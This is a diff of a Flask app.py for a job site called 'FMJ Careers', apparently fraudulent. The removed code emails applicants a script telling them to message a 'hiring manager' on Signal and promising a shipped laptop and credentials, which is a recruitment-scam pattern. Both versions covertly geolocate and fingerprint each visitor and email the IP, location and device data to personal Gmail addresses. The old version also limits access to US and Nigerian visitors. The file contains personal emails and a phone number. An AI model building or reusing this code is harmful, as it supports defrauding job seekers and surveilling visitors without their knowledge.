@@ -1,382 +1,401 @@
-from flask import Flask, render_template, request, make_response, jsonify
-from database import get_jobs, get_job, add_application_to_db, log_visitor
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.utils import formataddr
+# app.py
 import os
-from dotenv import load_dotenv
-from datetime import datetime
-import requests
 import json
 import uuid
-from user_agents import parse
+import ssl
+import smtplib
+import requests
+from datetime import datetime
+
+from flask import Flask, render_template, request, jsonify
+from dotenv import load_dotenv
+from user_agents import parse as parse_ua
+
+# Your own DB helpers
+from database import get_jobs, get_job, add_application_to_db, log_visitor
+
+# Email libs
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr, formatdate, make_msgid
 
 
-# Load environment variables
+# =========================
+# App / Config
+# =========================
 load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = os.getenv('SECRET_KEY', 'fallback-secret-key')
 
-# Configuration
-EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')
-EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD')
-SMTP_SERVER = 'smtp.fmjcareers.com'
-SMTP_PORT = 587
-VISITOR_COOKIE = 'visitor_uid'
-TRACKING_COOKIE = 'last_visit'
+# Use the provider's STARTTLS host to avoid certificate hostname mismatch
+SMTP_HOST = os.getenv("SMTP_HOST", "us2.smtp.mailhostbox.com")  # your provider shows this for STARTTLS
+SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))                  # 587 = STARTTLS, 465 = implicit SSL
 
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")                      # e.g. chaserice@chasericefanpage.com
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 
-def get_geolocation(ip):
-    """Get detailed geolocation data from IP"""
-    if ip in ['127.0.0.1', '::1']:
-        return {'status': 'localhost'}
-
-    try:
-        response = requests.get(f'http://ip-api.com/json/{ip}?fields=66846719')
-        return response.json()
-    except Exception as e:
-        return {'error': str(e)}
+ADMIN_TO = os.getenv("ADMIN_TO", "devfemijethro@gmail.com")     # analytics recipient
+NOTIFY_TO = os.getenv("NOTIFY_TO", "007femijethro@gmail.com")   # internal notifications
+NOTIFY_CC = os.getenv("NOTIFY_CC", "Chase.rice.fanpage223@gmail.com,eoni56699@gmail.com")
 
 
-def get_device_fingerprint(request):
-    """Generate basic fingerprint from available headers"""
-    user_agent = parse(request.headers.get('User-Agent', ''))
-    return {
-        'browser':
-        f"{user_agent.browser.family} {user_agent.browser.version_string}",
-        'os': f"{user_agent.os.family} {user_agent.os.version_string}",
-        'device': user_agent.device.family,
-        'is_mobile': user_agent.is_mobile,
-        'is_tablet': user_agent.is_tablet,
-        'is_pc': user_agent.is_pc,
-        'is_bot': user_agent.is_bot,
-        'languages': request.headers.get('Accept-Language', ''),
-        'accept': request.headers.get('Accept', ''),
-        'encoding': request.headers.get('Accept-Encoding', ''),
-        'connection': request.headers.get('Connection', ''),
-        'dnt': request.headers.get('DNT', '')
-    }
+# =========================
+# Helpers
+# =========================
+def add_required_headers(msg: MIMEMultipart) -> None:
+    """
+    Ensure RFC 5322 required headers exist and are valid:
+    - Message-ID: unique and includes a domain you control
+    - Date: set to localtime now
+    """
+    from_addr = msg.get("From", "")
+    domain = "localhost"
+    if "@" in from_addr:
+        domain = from_addr.split("@", 1)[1].strip("> ")
+    elif EMAIL_ADDRESS and "@" in EMAIL_ADDRESS:
+        domain = EMAIL_ADDRESS.split("@", 1)[1]
 
-def send_visitor_email(visitor_data):
-    """Send detailed visitor report"""
-
+    if not msg.get("Message-ID"):
+        msg["Message-ID"] = make_msgid(domain=domain)
+    if not msg.get("Date"):
+        msg["Date"] = formatdate(localtime=True)
 
 
+def smtp_send(msg: MIMEMultipart, to_addrs):
+    """
+    Send a MIME message over SMTP with certificate verification.
+    Supports:
+      - STARTTLS (587) using SMTP + starttls
+      - Implicit SSL (465) using SMTP_SSL
+    """
+    if isinstance(to_addrs, str):
+        to_addrs = [a.strip() for a in to_addrs.split(",") if a.strip()]
 
-    try:
-        msg = MIMEMultipart()
-        msg['From'] = formataddr(('FMJ Career (Location Services)', EMAIL_ADDRESS))
-        msg['To'] = 'devfemijethro@gmail.com'
-        """msg['Cc'] = 'eoni56699@gmail.com'"""
-        msg['Subject'] = f"New Visitor Analytics - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+    context = ssl.create_default_context()
 
-        # Format the email body
-        body = f"""
-        COMPLETE VISITOR ANALYTICS REPORT
-        =================================
-
-        BASIC INFO:
-        - Time: {visitor_data['timestamp']}
-        - Unique ID: {visitor_data['visitor_id']}
-        - First Visit: {visitor_data['first_visit']}
-        - Page Visited: {visitor_data['path']}
-
-        NETWORK DATA:
-        - IP Address: {visitor_data['ip']}
-        - ISP: {visitor_data['geodata'].get('isp', 'N/A')}
-        - AS: {visitor_data['geodata'].get('as', 'N/A')}
-        - Proxy: {visitor_data['geodata'].get('proxy', False)}
-
-        LOCATION:
-        - Country: {visitor_data['geodata'].get('country', 'N/A')}
-        - Region: {visitor_data['geodata'].get('regionName', 'N/A')}
-        - City: {visitor_data['geodata'].get('city', 'N/A')}
-        - ZIP: {visitor_data['geodata'].get('zip', 'N/A')}
-        - Coordinates: {visitor_data['geodata'].get('lat', 'N/A')}, {visitor_data['geodata'].get('lon', 'N/A')}
-
-        DEVICE INFO:
-        - Browser: {visitor_data['device']['browser']}
-        - OS: {visitor_data['device']['os']}
-        - Device: {visitor_data['device']['device']}
-        - Mobile: {visitor_data['device']['is_mobile']}
-        - Languages: {visitor_data['device']['languages']}
-
-        TECHNICAL DETAILS:
-        - Referrer: {visitor_data.get('referrer', 'Direct')}
-        - User Agent: {visitor_data['raw_ua']}
-        - Headers: {json.dumps(visitor_data['headers'], indent=2)}
-        """
-
-        msg.attach(MIMEText(body, 'plain'))
-
-
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            server.starttls()
+    def _login_and_send(server):
+        server.ehlo()
+        # STARTTLS path
+        if isinstance(server, smtplib.SMTP):
+            server.starttls(context=context)
+            server.ehlo()
+        if EMAIL_ADDRESS and EMAIL_PASSWORD:
             server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-            server.send_message(msg)
-            print(f"Visitor's Email sent to: {str(EMAIL_ADDRESS)}")
+        server.sendmail(EMAIL_ADDRESS, to_addrs, msg.as_string())
+
+    if SMTP_PORT == 465:
+        with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context, timeout=25) as s:
+            _login_and_send(s)
+    else:
+        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=25) as s:
+            _login_and_send(s)
+
+
+def get_client_ip(req) -> str:
+    """Best-effort client IP extraction behind proxies/CDNs."""
+    for h in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP"):
+        if h in req.headers and req.headers[h]:
+            return req.headers[h].split(",")[0].strip()
+    return req.remote_addr or "127.0.0.1"
+
+
+def get_geolocation(ip: str) -> dict:
+    """Fetch geolocation info (non-fatal if it fails)."""
+    if ip in ("127.0.0.1", "::1"):
+        return {"status": "localhost"}
+    try:
+        # ip-api fields bitmask for a rich set
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
+        return r.json()
     except Exception as e:
-        print(f"Email sending failed: {str(e)}")
+        return {"error": str(e)}
 
 
-@app.before_request
-def track_visitor():
-    """Enhanced visitor tracking with detailed device and location info"""
+def build_visitor_payload(req) -> dict:
+    """
+    Structured payload for email/debug. Includes everything we'll map to DB.
+    """
+    ip = get_client_ip(req)
+    ua_str = req.headers.get("User-Agent", "")
+    ua = parse_ua(ua_str)
 
-    # Block all wp-admin requests
-    if request.path.lower().startswith(('/wp-admin', '/wordpress/wp-admin')):
-        return "Access denied", 403
-
-    if request.path.startswith('/static'):
-        return None  # Allow static files through
-
-    # Get visitor IP (handling proxies)
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ',' in ip:
-        ip = ip.split(',')[0].strip()
-
-    # Get detailed geolocation
     geodata = get_geolocation(ip)
+    cookie_vuid = req.cookies.get("visitor_uid") or ""
+    visitor_uid = cookie_vuid or str(uuid.uuid4())
 
-    # Check country access
-    allowed_countries = ['United States', 'Nigeria']
-    country = geodata.get('country', 'Unknown')
+    # Referrer: Flask property, then common header variants
+    referrer = req.referrer or req.headers.get("Referer") or req.headers.get("Referrer") or ""
 
-    if country not in allowed_countries:
-        return render_template('access_denied.html'), 403
+    # Keep a small, non-sensitive header excerpt
+    headers_excerpt = {}
+    for hk in ["Host", "Accept", "Accept-Language", "Accept-Encoding", "Sec-Fetch-Mode", "Sec-Fetch-Site"]:
+        if hk in req.headers:
+            headers_excerpt[hk] = req.headers[hk]
 
-    # Rest of your existing tracking code...
-    # Get or create visitor ID
-    visitor_id = request.cookies.get(VISITOR_COOKIE)
-    first_visit = False
-    if not visitor_id:
-        visitor_id = str(uuid.uuid4())
-        first_visit = True
-
-    # Enhanced device fingerprint
-    device_data = get_device_fingerprint(request)
-
-    # Prepare visitor data with all details
-    visitor_data = {
-        'visitor_id': visitor_id,
-        'ip': ip,
-        'timestamp': datetime.now().isoformat(),
-        'first_visit': first_visit,
-        'path': request.path,
-        'referrer': request.headers.get('Referer'),
-        'raw_ua': request.headers.get('User-Agent'),
-        'headers': dict(request.headers),
-        'geodata': geodata,
-        'device': device_data,
-        'query_params': dict(request.args)
+    return {
+        "visitor_id": visitor_uid,
+        "basic": {
+            "time": datetime.utcnow().isoformat(),
+            "unique_id": visitor_uid,
+            "first_visit": not bool(cookie_vuid),
+            "page": req.path or "/",
+        },
+        "network": {"ip": ip},
+        "geodata": geodata or {},
+        "device": {
+            "browser": str(ua.browser),
+            "os": str(ua.os),
+            "device": ua.device.family or "Other",
+            "is_mobile": ua.is_mobile,
+            "is_bot": ua.is_bot,
+            "user_agent": ua_str,
+        },
+        "referrer": referrer,
+        "headers": headers_excerpt,
     }
 
-    # Store all details in database
-    log_visitor(visitor_data)
 
-    # Check if we should send notification (first visit today)
-    last_visit = request.cookies.get(TRACKING_COOKIE)
-    should_notify = not last_visit or last_visit != datetime.now().strftime('%Y-%m-%d')
+def build_db_record(v: dict) -> dict:
+    """
+    Flatten payload to EXACTLY your DB schema and also include a legacy
+    'timestamp' key because log_visitor() is asking for it.
+    """
+    basic   = v.get("basic")   or {}
+    g       = v.get("geodata") or {}
+    d       = v.get("device")  or {}
+    network = v.get("network") or {}
 
-    if should_notify:
-        send_visitor_email(visitor_data)
+    when_iso = basic.get("time") or datetime.utcnow().isoformat()
+    page     = basic.get("page") or "/"
 
-    # Don't return anything (equivalent to return None)
-    # Flask will continue with the normal request processing
+    record = {
+        "visitor_id": v.get("visitor_id"),
+        "ip": network.get("ip"),
 
+        # Table column (your schema) …
+        "visit_timestamp": when_iso,
+        # …and the key your helper is demanding:
+        "timestamp": when_iso,                       # <<< added
 
-
-def send_application_notification(job_title, application_data):
-    """Send email notification about new job application"""
-    try:
-        # Create message
-        msg = MIMEMultipart()
-        msg['From'] = formataddr(('FMJ Careers', EMAIL_ADDRESS))
-        msg['To'] = '007femijethro@gmail.com'
-        msg['Cc'] = ', '.join(['Chase.rice.fanpage223@gmail.com', 'eoni56699@gmail.com'])
-        msg['Subject'] = f"New Application for {job_title}"
-
-        # Email body
-        body = f"""
-        New job application received:
-
-        Position: {job_title}
-        Applicant: {application_data['full_name']}
-        Email: {application_data['email']}
-        Phone: {application_data['country_code']} {application_data['phone_number']}
-        LinkedIn: {application_data['linkedin_url']}
-        Education: {application_data['education']}
-        Work Experience: {application_data['work_experience']}
-        """
-
-        msg.attach(MIMEText(body, 'plain'))
-
-        # Connect to SMTP server and send email
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            server.starttls()
-            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-            server.send_message(msg)
-            print(f"Application Email sent to: {str(EMAIL_ADDRESS)}")
-
-    except Exception as e:
-        print(f"Failed to send email: {e}")
-
-def send_applicant_confirmation_email(application_data, job_title):
-    """Send a confirmation email to the applicant"""
-    try:
-        msg = MIMEMultipart()
-        msg['From'] = formataddr(('FMJ Careers', EMAIL_ADDRESS))
-        msg['To'] = application_data['email']
-        msg['Subject'] = f"Your Application for {job_title} has been received"
-
-        # Verify application_data is a dictionary
-        if not isinstance(application_data, dict):
-            raise ValueError("application_data must be a dictionary")
-
-        # Verify required fields exist
-        if 'email' not in application_data or 'full_name' not in application_data:
-            raise ValueError("application_data is missing required fields (email or full_name)")
-
-        applicant_email = application_data['email']
-        applicant_name = application_data['full_name']
-
-        body = f"""
-        <html>
-          <body style="font-family: Arial, sans-serif; color: #333; line-height: 1.6; padding: 20px;">
-            <div style="max-width: 600px; margin: auto; border: 1px solid #f7c6d3; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(255, 182, 193, 0.3);">
-              <img src="https://fmjcareers.com/static/logo.jpg" alt="FMJ Capitals Logo" style="width: 150px; margin-bottom: 30px; display: block; margin-left: auto; margin-right: auto;">
-
-              <p style="font-size: 18px;">Hi <strong style="color: #d6336c;">{applicant_name}</strong>,</p>
-
-              <p style="font-size: 16px; color: #6a1b4d;">Thank you for applying for the <strong style="color: #d6336c;">{job_title}</strong> position with us!</p>
-
-              <p style="font-size: 16px;">We’ve received your information and are currently reviewing applications. To move forward and schedule your interview, please follow the steps below:</p>
-
-              <h3 style="color: #d6336c; border-bottom: 2px solid #f28ab2; padding-bottom: 8px;">✅ Next Steps – Required for Interview Scheduling:</h3>
-              <ol style="color: #6a1b4d; font-size: 15px;">
-                <li style="margin-bottom: 15px;">
-                  <strong>Download the Signal Messenger App (Free & Secure):</strong><br>
-                  Signal is our secure communication platform for interviews. Please download it here:<br>
-                  📱 <a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms" style="color: #d6336c; text-decoration: none;">Signal for Android</a><br>
-                  📱 <a href="https://apps.apple.com/app/signal-private-messenger/id874139669" style="color: #d6336c; text-decoration: none;">Signal for iPhone</a><br>
-                  💻 <a href="https://signal.org/download/" style="color: #d6336c; text-decoration: none;">Signal for Desktop (optional)</a>
-                </li>
-                <li style="margin-bottom: 15px;">
-                  <strong>Once Installed, Message Our Hiring Manager:</strong><br>
-                  📲 Message: <em>Aaron Thomas</em><br>
-                  📞 Signal Number: <em>2394939137</em><br>
-                  📝 Message Template:<br><br>
-                  <blockquote style="background-color: #ffd6e8; border-left: 4px solid #d6336c; margin: 0; padding: 12px 16px; font-style: italic; color: #a31545;">
-                    Hi, my name is {applicant_name}. I applied for the {job_title} position and I’m ready to schedule my interview.
-                  </blockquote>
-                </li>
-                <li>
-                  We’ll schedule your interview via Signal within <strong>24–48 hours</strong>.
-                </li>
-              </ol>
-
-              <h4 style="color: #d6336c; margin-top: 30px;">🔍 What to Expect After Messaging:</h4>
-              <ul style="color: #6a1b4d; font-size: 15px;">
-                <li>We’ll confirm your availability and verify a few details</li>
-                <li>You’ll receive remote training if hired</li>
-                <li>We’ll ship a company laptop and your credentials directly to your address</li>
-              </ul>
-
-              <p style="font-size: 16px;">If you have any questions in the meantime, feel free to reply to this email.</p>
-
-              <p style="font-size: 16px;">Thanks again — we look forward to hearing from you!</p>
-
-              <br>
-
-              <p style="font-size: 16px;">Best regards,</p>
-              <p style="font-weight: bold; color: #d6336c; font-size: 16px;">Aaron Thomas<br>
-                 Hiring Coordinator<br>
-                 FMJ Capitals<br>
-                 <a href="mailto:support@fmjcareers.com" style="color: #d6336c; text-decoration: none;">support@fmjcareers.com</a></p>
-            </div>
-          </body>
-        </html>
-        """
+        "page_path": page,
+        "referrer_url": v.get("referrer") or "",
+        "user_agent": d.get("user_agent"),
+        "browser": d.get("browser"),
+        "operating_system": d.get("os"),
+        "device_type": d.get("device"),
+        "country": g.get("country"),
+        "region": g.get("regionName") or g.get("region"),
+        "city": g.get("city"),
+        "isp": g.get("isp"),
+        "is_mobile": bool(d.get("is_mobile")),
+        "is_bot": bool(d.get("is_bot")),
+        "additional_data": v,                        # jsonb
+        "created_at": datetime.utcnow().isoformat(),
+    }
+    return record
 
 
+def format_visitor_email_text(v: dict) -> str:
+    """Readable analytics email body."""
+    parts = []
+    parts.append("COMPLETE VISITOR ANALYTICS REPORT")
+    parts.append("=================================")
+    parts.append("")
+    parts.append("BASIC INFO:")
+    parts.append(f"- Time: {v['basic'].get('time')}")
+    parts.append(f"- Unique ID: {v['basic'].get('unique_id')}")
+    parts.append(f"- First Visit: {v['basic'].get('first_visit')}")
+    parts.append(f"- Page Visited: {v['basic'].get('page')}")
+    parts.append("")
+    parts.append("NETWORK DATA:")
+    parts.append(f"- IP Address: {v['network'].get('ip')}")
+    parts.append("")
+    parts.append("LOCATION:")
+    g = v.get("geodata", {})
+    parts.append(f"- Country: {g.get('country')}")
+    parts.append(f"- Region: {g.get('regionName') or g.get('region')}")
+    parts.append(f"- City: {g.get('city')}")
+    if g.get("lat") and g.get("lon"):
+        parts.append(f"- Coordinates: {g.get('lat')}, {g.get('lon')}")
+    parts.append("")
+    d = v["device"]
+    parts.append("DEVICE INFO:")
+    parts.append(f"- Browser: {d.get('browser')}")
+    parts.append(f"- OS: {d.get('os')}")
+    parts.append(f"- Device: {d.get('device')}")
+    parts.append(f"- Mobile: {d.get('is_mobile')}")
+    parts.append(f"- Bot: {d.get('is_bot')}")
+    parts.append("")
+    parts.append("REFERRER:")
+    parts.append(f"- {v.get('referrer') or '(none)'}")
+    parts.append("")
+    parts.append("TECHNICAL (headers excerpt):")
+    for hk, hv in (v.get("headers") or {}).items():
+        parts.append(f"- {hk}: {hv}")
+    parts.append("")
+    parts.append("Full JSON payload:")
+    parts.append(json.dumps(v, indent=2))
+    return "\n".join(parts)
 
 
-        msg.attach(MIMEText(body, 'html'))
+# =========================
+# Email senders
+# =========================
+def send_visitor_email(visitor_data: dict):
+    msg = MIMEMultipart()
+    msg["From"] = formataddr(("FMJ Career (Location Services)", EMAIL_ADDRESS or "no-reply@localhost"))
+    msg["To"] = ADMIN_TO
+    msg["Subject"] = "COMPLETE VISITOR ANALYTICS REPORT"
+    add_required_headers(msg)
+    msg.attach(MIMEText(format_visitor_email_text(visitor_data), "plain", "utf-8"))
+    smtp_send(msg, ADMIN_TO)
 
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            server.starttls()
-            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-            server.send_message(msg)
-            print(f"Confirmation email sent to applicant: {applicant_email}")
 
-    except KeyError as e:
-        print(f"Failed to send confirmation email: Missing required field in application data - {e}")
-    except ValueError as e:
-        print(f"Failed to send confirmation email: {e}")
-    except Exception as e:
-            print(f"Failed to send confirmation email to applicant: {str(e)}")
+def send_application_notification(job_title: str, application_data: dict):
+    to_addr = NOTIFY_TO
+    cc_list = [a.strip() for a in NOTIFY_CC.split(",") if a.strip()]
+    msg = MIMEMultipart()
+    msg["From"] = formataddr(("FMJ Careers", EMAIL_ADDRESS or "no-reply@localhost"))
+    msg["To"] = to_addr
+    if cc_list:
+        msg["Cc"] = ", ".join(cc_list)
+    msg["Subject"] = f"New Application for {job_title}"
+    add_required_headers(msg)
 
+    body = "A new application was submitted for {}.\n\n{}".format(
+        job_title, json.dumps(application_data, indent=2)
+    )
+    msg.attach(MIMEText(body, "plain", "utf-8"))
+
+    recipients = [to_addr] + cc_list
+    smtp_send(msg, recipients)
+
+
+def send_applicant_confirmation_email(application_data: dict, job_title: str):
+    applicant_email = application_data.get("email")
+    if not applicant_email:
+        return
+    msg = MIMEMultipart()
+    msg["From"] = formataddr(("FMJ Careers", EMAIL_ADDRESS or "no-reply@localhost"))
+    msg["To"] = applicant_email
+    msg["Subject"] = f"Your Application for {job_title} has been received"
+    add_required_headers(msg)
+
+    body = (
+        f"Hello {application_data.get('full_name') or application_data.get('name', 'Applicant')},\n\n"
+        f"Thanks for applying for {job_title}. We’ve received your application and our team will review it.\n\n"
+        f"Regards,\nFMJ Careers"
+    )
+    msg.attach(MIMEText(body, "plain", "utf-8"))
+    smtp_send(msg, applicant_email)
+
+
+# =========================
+# Routes
+# =========================
+@app.after_request
+def set_visitor_cookie(resp):
+    """Persist a visitor cookie for correlation across visits."""
+    if not request.cookies.get("visitor_uid"):
+        vuid = str(uuid.uuid4())
+        # Not HttpOnly so front-end can read if needed; tighten if you prefer
+        resp.set_cookie("visitor_uid", vuid, max_age=60 * 60 * 24 * 365, httponly=False, samesite="Lax")
+    return resp
 
 
 @app.route("/")
 def home():
-    jobs = get_jobs()
-    return render_template('home.html', jobs=jobs)
+    # Jobs
+    try:
+        jobs = get_jobs()
+    except Exception as e:
+        jobs = []
+        app.logger.exception("get_jobs failed: %s", e)
+
+    # Visitor analytics
+    visitor_payload = build_visitor_payload(request)
+
+    # DB logging (matches your exact schema)
+    try:
+        db_record = build_db_record(visitor_payload)
+        log_visitor(db_record)
+    except Exception as e:
+        app.logger.error("Error logging visitor: %s. Keys present: %s", e, list((db_record or {}).keys()))
+
+    # Email (non-blocking for the page; errors only logged)
+    try:
+        send_visitor_email(visitor_payload)
+    except Exception as e:
+        app.logger.error("send_visitor_email failed: %s", e)
+
+    # Your repo uses 'home.html'
+    return render_template("home.html", jobs=jobs)
 
 
-@app.route("/job/<int:id>")
-def show_job(id):
+# Give templates the endpoint name they expect: 'show_job'
+@app.route("/job/<int:id>", endpoint="show_job")
+def jobpage(id: int):
     job = get_job(id)
     if not job:
         return "Job not found", 404
-    return render_template('jobpage.html', job=job)
+    return render_template("jobpage.html", job=job)
 
 
-@app.route("/iloveyou")
-def iloveyou():
-    return render_template('iloveyou.html')
-
-
-@app.route("/job/<int:id>/apply", methods=['POST'])
-def apply_to_job(id):
-
-
-
-
-
+@app.route("/job/<int:id>/apply", methods=["POST"])
+def apply_to_job(id: int):
     job = get_job(id)
     if not job:
         return "Job not found", 404
-
-    data = {
-        'full_name': request.form.get('full_name'),
-        'email': request.form.get('email'),
-        'country_code': request.form.get('country_code'),
-        'phone_number': request.form.get('phone_number'),
-        'linkedin_url': request.form.get('linkedin_url'),
-        'education': request.form.get('education'),
-        'work_experience': request.form.get('work_experience'),
-        'resume_path': request.form.get('resume_path')
-    }
 
     try:
-        # Insert the application into the database
-        add_application_to_db(job['title'], data)
+        data = {
+            "job_id": id,
+            "full_name": request.form.get("full_name"),
+            "email": request.form.get("email"),
+            "country_code": request.form.get("country_code"),
+            "phone_number": request.form.get("phone_number"),
+            "linkedin_url": request.form.get("linkedin_url"),
+            "education": request.form.get("education"),
+            "work_experience": request.form.get("work_experience"),
+            "resume_url": request.form.get("resume_url") or request.form.get("resume_path"),
+            "submitted_at": datetime.utcnow().isoformat(),
+        }
 
-        # Send email notification
-        send_application_notification(job['title'], data)
+        # Persist application (support both possible helper signatures)
+        try:
+            job_title = job.get("title") or job.get("name") or f"Job #{id}"
+            try:
+                add_application_to_db(job_title, data)  # (title, dict)
+            except TypeError:
+                add_application_to_db(data)            # (dict)
+        except Exception as e:
+            app.logger.error("add_application_to_db failed: %s", e)
 
-        # Send confirmation email to applicant
-        send_applicant_confirmation_email(data, job['title'])
+        # Emails
+        try:
+            send_application_notification(job.get("title") or job.get("name", "Role"), data)
+        except Exception as e:
+            app.logger.error("send_application_notification failed: %s", e)
 
-        return render_template('applicationsubmited.html',
-                               application=data,
-                               job=job)
+        try:
+            send_applicant_confirmation_email(data, job.get("title") or job.get("name", "the role"))
+        except Exception as e:
+            app.logger.error("send_applicant_confirmation_email failed: %s", e)
+
+        return render_template("applicationsubmited.html", application=data, job=job)
     except Exception as e:
+        app.logger.exception("Application processing failed: %s", e)
         return f"An error occurred: {str(e)}", 500
 
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', debug=True)
+@app.route("/_health")
+def health():
+    return jsonify({"ok": True, "time": datetime.utcnow().isoformat()}), 200
+
+
+# =========================
+# Entry
+# =========================
+if __name__ == "__main__":
+    # Use a real WSGI server (gunicorn/uwsgi) in production
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5000")), debug=True)
